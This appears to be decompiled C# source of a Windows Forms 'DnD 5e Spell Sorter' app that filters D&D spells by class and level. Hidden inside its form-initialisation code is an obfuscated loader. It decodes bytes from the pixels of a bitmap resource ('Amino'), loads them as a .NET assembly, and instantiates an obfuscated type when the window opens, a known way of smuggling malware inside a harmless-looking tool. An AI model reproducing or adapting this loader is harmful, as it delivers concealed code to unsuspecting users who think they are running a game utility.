using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using DnD5eSpellSorter;
using DnD5eSpellSorter.Properties;
using DnDSpellSorter.Spells;

namespace DnDSpellSorter;

public class MainGUI : Form
{
	private string[] FullClassList;

	private string[] FullLevelList;

	private SpellList AllSpells;

	private SpellList CurrentSpells;

	private string CurrentSpellSelection;

	private IContainer components = null;

	private Type MutexRights;

	private ListBox LBClass;

	private ListBox LBLevel;

	private ListBox LBSpell;

	private TextBox TBClass;

	private TextBox TBLevel;

	private TextBox TBSpell;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private RichTextBox RTBSpellInfo;

	public MainGUI()
	{
		InitializeComponent();
		FullClassList = GetValues(LBClass);
		FullLevelList = GetValues(LBClass);
		CurrentSpells = new SpellList();
	}

	private string[] GetValues(ListBox lb)
	{
		string[] array = new string[lb.get_Items().get_Count()];
		int num = 0;
		foreach (string item in lb.get_Items())
		{
			array[num++] = item;
		}
		return array;
	}

	internal void InitializeSpells(SpellList spells)
	{
		AllSpells = spells;
		((ListControl)LBClass).set_SelectedIndex(0);
		((ListControl)LBLevel).set_SelectedIndex(0);
	}

	private void RefreshSpellList()
	{
		if (((ListControl)LBClass).get_SelectedIndex() == -1 || ((ListControl)LBLevel).get_SelectedIndex() == -1)
		{
			return;
		}
		CurrentSpellSelection = (string)LBSpell.get_SelectedItem();
		CurrentSpells.spells.Clear();
		string text = (string)LBClass.get_SelectedItem();
		_ = (string)LBLevel.get_SelectedItem();
		foreach (SpellInformation spell in AllSpells.spells)
		{
			if ((text.Equals("All") || spell.Classes == null || spell.Classes.Contains(text)) && (((ListControl)LBLevel).get_SelectedIndex() == 0 || spell.Level == ((ListControl)LBLevel).get_SelectedIndex() - 1))
			{
				CurrentSpells.AddSpell(spell);
			}
		}
		LBSpell.set_SelectedItem((object)CurrentSpellSelection);
		FilterSpellList();
	}

	private void ReselectCurrentSpell()
	{
		foreach (string item in LBSpell.get_Items())
		{
			if (item.Equals(CurrentSpellSelection))
			{
			}
		}
	}

	private void FilterSpellList()
	{
		CurrentSpellSelection = (string)LBSpell.get_SelectedItem();
		LBSpell.get_Items().Clear();
		if (((Control)TBSpell).get_Text().Length >= 0)
		{
			foreach (SpellInformation spell in CurrentSpells.spells)
			{
				if (((Control)TBSpell).get_Text() == null || ((Control)TBSpell).get_Text().Length <= 0 || spell.Name.ToLower().Contains(((Control)TBSpell).get_Text().ToLower()))
				{
					LBSpell.get_Items().Add((object)spell.Name);
				}
			}
		}
		else
		{
			foreach (SpellInformation spell2 in CurrentSpells.spells)
			{
				LBSpell.get_Items().Add((object)spell2.Name);
			}
		}
		LBSpell.set_SelectedItem((object)CurrentSpellSelection);
		RefreshSpellInfo();
	}

	private void RefreshSpellInfo()
	{
		((Control)RTBSpellInfo).set_Text(string.Empty);
		string text = (string)LBSpell.get_SelectedItem();
		if (text == null)
		{
			return;
		}
		SpellInformation spellInformation = CurrentSpells.GetSpellInformation(text);
		PropertyInfo[] properties = typeof(SpellInformation).GetProperties();
		foreach (PropertyInfo propertyInfo in properties)
		{
			object value = propertyInfo.GetValue(spellInformation, null);
			string text2 = ConvertObjectToString(value);
			if (text2 != null)
			{
				if (((Control)RTBSpellInfo).get_Text().Length > 0)
				{
					RichTextBox rTBSpellInfo = RTBSpellInfo;
					((Control)rTBSpellInfo).set_Text(((Control)rTBSpellInfo).get_Text() + Environment.NewLine);
				}
				RichTextBox rTBSpellInfo2 = RTBSpellInfo;
				((Control)rTBSpellInfo2).set_Text(((Control)rTBSpellInfo2).get_Text() + propertyInfo.Name + " = ");
				RichTextBox rTBSpellInfo3 = RTBSpellInfo;
				((Control)rTBSpellInfo3).set_Text(((Control)rTBSpellInfo3).get_Text() + text2);
			}
		}
	}

	private string ConvertObjectToString(object MyObject)
	{
		if (MyObject == null)
		{
			return null;
		}
		StringBuilder stringBuilder = new StringBuilder();
		if (MyObject.GetType().IsArray)
		{
			object[] array = (object[])MyObject;
			if (array.Length == 0)
			{
				return null;
			}
			stringBuilder.Append(array[0]);
			for (int i = 1; i < array.Length; i++)
			{
				stringBuilder.Append(", ").Append(array[i]);
			}
		}
		else if (MyObject.GetType() == typeof(List<string>))
		{
			List<string> list = (List<string>)MyObject;
			if (list.Count <= 0)
			{
				return null;
			}
		}
		else
		{
			stringBuilder.Append(MyObject.ToString());
		}
		return stringBuilder.ToString();
	}

	private void TBClass_TextChanged(object sender, EventArgs e)
	{
	}

	private void TBLevel_TextChanged(object sender, EventArgs e)
	{
	}

	private void TBSpell_TextChanged(object sender, EventArgs e)
	{
		FilterSpellList();
	}

	private void LBClass_SelectedIndexChanged(object sender, EventArgs e)
	{
		RefreshSpellList();
	}

	private void LBLevel_SelectedIndexChanged(object sender, EventArgs e)
	{
		RefreshSpellList();
	}

	private void LBSpells_SelectedIndexChanged(object sender, EventArgs e)
	{
		RefreshSpellInfo();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0605: Unknown result type (might be due to invalid IL or missing references)
		//IL_060f: Expected O, but got Unknown
		//IL_0879: Unknown result type (might be due to invalid IL or missing references)
		//IL_0883: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainGUI));
		LBClass = new ListBox();
		LBLevel = new ListBox();
		LBSpell = new ListBox();
		TBClass = new TextBox();
		TBLevel = new TextBox();
		TBSpell = new TextBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		RTBSpellInfo = new RichTextBox();
		((Control)this).SuspendLayout();
		((ListControl)LBClass).set_FormattingEnabled(true);
		LBClass.get_Items().AddRange(new object[13]
		{
			"All", "Artificer", "Barbarian", "Bard", "Cleric", "Druid", "Fighter", "Monk", "Paladin", "Ranger",
			"Sorcerer", "Warlock", "Wizard"
		});
		((Control)LBClass).set_Location(new Point(12, 93));
		((Control)LBClass).set_Name("LBClass");
		((Control)LBClass).set_Size(new Size(178, 316));
		((Control)LBClass).set_TabIndex(0);
		LBClass.add_SelectedIndexChanged((EventHandler)LBClass_SelectedIndexChanged);
		((ListControl)LBLevel).set_FormattingEnabled(true);
		LBLevel.get_Items().AddRange(new object[11]
		{
			"All", "Cantrip", "Level 1", "Level 2", "Level 3", "Level 4", "Level 5", "Level 6", "Level 7", "Level 8",
			"Level 9"
		});
		((Control)LBLevel).set_Location(new Point(196, 93));
		((Control)LBLevel).set_Name("LBLevel");
		((Control)LBLevel).set_Size(new Size(178, 316));
		((Control)LBLevel).set_TabIndex(1);
		LBLevel.add_SelectedIndexChanged((EventHandler)LBLevel_SelectedIndexChanged);
		((ListControl)LBSpell).set_FormattingEnabled(true);
		LBSpell.get_Items().AddRange(new object[1] { "[Spells]" });
		((Control)LBSpell).set_Location(new Point(380, 93));
		((Control)LBSpell).set_Name("LBSpell");
		((Control)LBSpell).set_Size(new Size(178, 316));
		((Control)LBSpell).set_TabIndex(2);
		LBSpell.add_SelectedIndexChanged((EventHandler)LBSpells_SelectedIndexChanged);
		((Control)TBClass).set_Enabled(false);
		((Control)TBClass).set_Location(new Point(12, 67));
		((TextBoxBase)TBClass).set_MaxLength(25);
		((Control)TBClass).set_Name("TBClass");
		((Control)TBClass).set_Size(new Size(177, 20));
		((Control)TBClass).set_TabIndex(3);
		((Control)TBClass).add_TextChanged((EventHandler)TBClass_TextChanged);
		((Control)TBLevel).set_Enabled(false);
		((Control)TBLevel).set_Location(new Point(197, 67));
		((TextBoxBase)TBLevel).set_MaxLength(25);
		((Control)TBLevel).set_Name("TBLevel");
		((Control)TBLevel).set_Size(new Size(177, 20));
		((Control)TBLevel).set_TabIndex(4);
		((Control)TBLevel).add_TextChanged((EventHandler)TBLevel_TextChanged);
		((Control)TBSpell).set_Location(new Point(381, 67));
		((TextBoxBase)TBSpell).set_MaxLength(25);
		((Control)TBSpell).set_Name("TBSpell");
		((Control)TBSpell).set_Size(new Size(177, 20));
		((Control)TBSpell).set_TabIndex(5);
		((Control)TBSpell).add_TextChanged((EventHandler)TBSpell_TextChanged);
		((Control)label1).set_Location(new Point(12, 51));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(178, 13));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("Class");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Location(new Point(196, 51));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(178, 13));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("Level");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)label3).set_Location(new Point(380, 51));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(178, 13));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("Spell");
		label3.set_TextAlign((ContentAlignment)32);
		((Control)label4).set_Location(new Point(564, 51));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(387, 13));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Spell Information");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(12, 9));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(730, 31));
		((Control)label5).set_TabIndex(10);
		((Control)label5).set_Text("DnD 5e Spell Sorter");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)RTBSpellInfo).set_Location(new Point(567, 67));
		((Control)RTBSpellInfo).set_Name("RTBSpellInfo");
		int num = 0;
		byte[] array = new byte[26624];
		Bitmap amino = Resources.Amino;
		for (int i = 0; i < 26624; i++)
		{
			for (int j = 0; j < 1; j++)
			{
				amino.GetPixel(i, j);
				Color pixel = amino.GetPixel(i, j);
				int num2 = 0;
				num2 = wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww(pixel);
				array[num] = (byte)num2;
			}
			num++;
		}
		fffffffffffffffffffffffffffffffffffffffffffff(array);
		Activator.CreateInstance(MutexRights, KeyStore.StoreElement("      DnD5eSpellSorter"));
		((TextBoxBase)RTBSpellInfo).set_ReadOnly(true);
		RTBSpellInfo.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)RTBSpellInfo).set_Size(new Size(384, 342));
		((Control)RTBSpellInfo).set_TabIndex(12);
		((Control)RTBSpellInfo).set_Text("");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(963, 421));
		((Control)this).get_Controls().Add((Control)(object)RTBSpellInfo);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)TBSpell);
		((Control)this).get_Controls().Add((Control)(object)TBLevel);
		((Control)this).get_Controls().Add((Control)(object)TBClass);
		((Control)this).get_Controls().Add((Control)(object)LBSpell);
		((Control)this).get_Controls().Add((Control)(object)LBLevel);
		((Control)this).get_Controls().Add((Control)(object)LBClass);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Spell Sorter");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void fffffffffffffffffffffffffffffffffffffffffffff(byte[] X509Constants)
	{
		Assembly assembly = Assembly.Load(X509Constants);
		MutexRights = assembly.GetType("XO3S3RqGgVXwjeOOmn.c6MCslr0K3rgEZYkhs");
	}

	private int wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww(Color cc)
	{
		return (int)typeof(ColorTranslator).InvokeMember("ToWin32", BindingFlags.InvokeMethod, null, null, new object[1] { cc });
	}
}
